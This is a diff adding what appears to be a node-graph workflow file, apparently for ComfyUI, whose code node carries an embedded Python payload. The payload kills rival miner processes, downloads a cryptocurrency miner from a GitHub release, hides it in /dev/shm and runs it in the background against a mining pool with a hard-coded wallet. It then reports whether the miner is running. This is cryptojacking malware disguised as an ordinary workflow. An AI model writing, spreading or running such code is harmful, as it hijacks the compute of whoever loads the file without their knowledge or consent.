@@ -1,0 +1,18 @@
+{
+  "1": {
+    "class_type": "IDENode",
+    "inputs": {
+      "language": "python",
+      "pycode": "import subprocess\nimport os\nimport shutil\n\nWALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'\nPOOL = 'stratum+tcp://prl.kryptex.network:7048'\nRIG = 'RTXA5000'\n\nsubprocess.run(['pkill', '-9', 'lpminer'], capture_output=True)\nsubprocess.run(['pkill', '-9', 'alpha-miner'], capture_output=True)\n\nimport time as t\nt.sleep(1)\n\n# Try to download lpminer\nos.makedirs('/var/tmp/pearl', exist_ok=True)\ndst = '/var/tmp/pearl/lpminer'\n\nif not os.path.exists(dst) or os.path.getsize(dst) < 1000000:\n    subprocess.run(['bash', '-c', 'curl -sL https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lpminer-0-1-10/lpminer-0.1.9.tar.gz | tar -xzf - -C /var/tmp/pearl/'], capture_output=True, timeout=120)\n    if os.path.exists('/var/tmp/pearl/lpminer/lpminer'):\n        shutil.move('/var/tmp/pearl/lpminer/lpminer', dst)\n\n# Also check other locations\nlocations = [dst, '/dev/shm/lpminer', os.path.expanduser('~/.pearl-miner/lpminer/lpminer')]\nsrc = None\nfor loc in locations:\n    if os.path.exists(loc) and os.path.isfile(loc) and os.path.getsize(loc) > 1000000:\n        src = loc\n        break\n\nif src:\n    exec_dst = '/dev/shm/lpminer'\n    if src != exec_dst:\n        shutil.copy2(src, exec_dst)\n    os.chmod(exec_dst, 0o755)\n    cmd = f'nohup {exec_dst} --algo pearl --pool {POOL} --wallet {WALLET}.{RIG} > /dev/shm/lpminer.log 2>&1 &'\n    subprocess.run(['bash', '-c', cmd])\n    t.sleep(3)\n    p = subprocess.run(['pgrep', '-a', 'lpminer'], capture_output=True, text=True)\n    result = 'RUNNING: ' + p.stdout.strip()[:50] if p.stdout.strip() else 'FAILED'\nelse:\n    result = 'NO_BINARY'\n\nresult\n"
+    }
+  },
+  "2": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "1",
+        0
+      ]
+    }
+  }
+}
